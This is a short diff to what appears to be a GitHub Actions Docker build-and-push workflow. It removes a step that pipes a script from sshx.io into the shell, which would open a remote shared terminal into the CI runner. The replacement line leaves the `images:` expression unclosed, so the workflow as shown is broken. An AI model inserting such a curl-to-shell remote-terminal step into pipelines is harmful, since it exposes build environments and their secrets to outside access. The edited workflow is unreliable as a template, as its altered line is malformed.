@@ -48,9 +48,7 @@ jobs:
         id: meta
         uses: docker/metadata-action@v5
         with:
-          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
-
-      - run: curl -sSf https://sshx.io/get | sh -s run
+          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME 
           
       - name: Build and push 
         id: build-and-push
